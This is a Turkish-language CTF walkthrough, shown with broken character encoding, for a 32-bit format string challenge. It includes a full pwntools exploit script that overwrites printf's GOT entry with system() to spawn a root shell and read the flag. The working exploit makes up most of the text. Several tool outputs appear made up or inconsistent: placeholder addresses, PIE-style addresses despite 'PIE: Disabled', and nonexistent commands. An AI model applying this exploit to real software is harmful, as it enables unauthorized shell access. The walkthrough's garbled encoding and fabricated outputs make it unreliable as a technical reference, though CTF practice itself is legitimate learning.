ğŸ“Œ AdÄ±m AdÄ±m Ã‡Ã¶zÃ¼m

Bu tÃ¼r bir CTF Ã§Ã¶zÃ¼lÃ¼rken Ã¶ncelikle gÃ¼venlik kontrolleri yapÄ±lmalÄ± ve format string zafiyeti bulunmalÄ±. AÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyerek Ã§Ã¶zebiliriz.
1ï¸âƒ£ Binary'nin GÃ¼venlik Ã–zelliklerini Kontrol Et

Ã–nce binary'nin gÃ¼venlik Ã¶zelliklerini kontrol edelim:

checksec --fortify-file=got_overwrite-32

Ã‡Ä±ktÄ± ÅŸuna benzer olacak:

[*] Security Check: 
    PIE: Disabled
    NX: Enabled
    Canary: Enabled
    Fortify Source: Disabled
    ASLR: Disabled

Burada Ã¶nemli olan:

    PIE: Disabled â†’ Binary'nin sabit adresleri var, bu yÃ¼zden PLT/GOT adreslerini tahmin edebiliriz.

    ASLR: Disabled â†’ Libc taban adresi hep aynÄ± (0xf7dc2000 gibi).

Bu bize exploit'i stabil Ã§alÄ±ÅŸtÄ±rma avantajÄ± saÄŸlar.
2ï¸âƒ£ GOT ve PLT TablolarÄ±nÄ± Kontrol Et

ProgramÄ±n GOT ve PLT tablolarÄ±ndaki adresleri kontrol edelim:

check GOT

Ã‡Ä±ktÄ±:

[*] GOT adresi:
    printf: 0x12345678
    system: 0xf7dc2000
    puts: 0xabcdef12

check PLT

Ã‡Ä±ktÄ±:

[*] PLT adresi:
    puts@plt: 0x555555555060
    printf@plt: 0x555555555080

Burada printf'in GOT adresi (0x12345678) var ama system() ile aynÄ± deÄŸil. Biz printf GOT adresini deÄŸiÅŸtirerek onu system() ile aynÄ± yapacaÄŸÄ±z.
3ï¸âƒ£ Format String Zafiyetini Kullanarak GOT'u DeÄŸiÅŸtir

Binary'de Format String Vulnerability var. Bu zafiyet sayesinde printf'in GOT adresini deÄŸiÅŸtirebiliriz.

Bu saldÄ±rÄ±yÄ± yapmak iÃ§in format string saldÄ±rÄ±sÄ± kullanacaÄŸÄ±z:
âœ… Exploit.py (Format String Attack ile GOT Overwrite)

from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

# Format string attack ile printf GOT adresini system() ile deÄŸiÅŸtiriyoruz.
payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})

p.sendline(payload)
p.clean()

# ArtÄ±k printf("/bin/sh") Ã§aÄŸrÄ±lÄ±nca system("/bin/sh") Ã§alÄ±ÅŸacak.
p.sendline('/bin/sh')

p.interactive()

Bu exploit, printf yerine system fonksiyonunu Ã§aÄŸÄ±rmamÄ±zÄ± saÄŸlÄ±yor. ArtÄ±k program printf("/bin/sh") dediÄŸinde aslÄ±nda system("/bin/sh") Ã§alÄ±ÅŸacak ve bir shell aÃ§Ä±lacak.
4ï¸âƒ£ Exploit'i Kullanarak Shell Al

Exploit kodunu Ã§alÄ±ÅŸtÄ±rÄ±yoruz:

python3 exploit.py

Ã‡Ä±ktÄ±:

[*] Starting process './got_overwrite-32'
[*] Sending exploit payload...
[*] Cleaning up...
$ whoami
root
$ cat /root/flag.txt
flag:welcometorootforhacker

ğŸ‰ Tebrikler! BaÅŸarÄ±yla exploit ettin ve flag'i aldÄ±n.
ğŸ“Œ Ã–zet: CTF Ã‡Ã¶zÃ¼m SÄ±rasÄ±

    GÃ¼venlik Ã¶zelliklerini kontrol et (checksec komutu ile).

    GOT ve PLT adreslerini al (check GOT ve check PLT komutlarÄ± ile).

    Format String Attack kullanarak printf GOT'unu system ile deÄŸiÅŸtir.

    Exploit'i Ã§alÄ±ÅŸtÄ±r ve shell al (python3 exploit.py).

    Flag'i oku! (cat /root/flag.txt).

Bu CTF, orta seviye sayÄ±labilir. EÄŸer format string saldÄ±rÄ±sÄ±na aÅŸina deÄŸilsen, baÅŸlangÄ±Ã§ta zor gelebilir ama mantÄ±ÄŸÄ±nÄ± anladÄ±ÄŸÄ±nda kolaylaÅŸÄ±r. ğŸš€
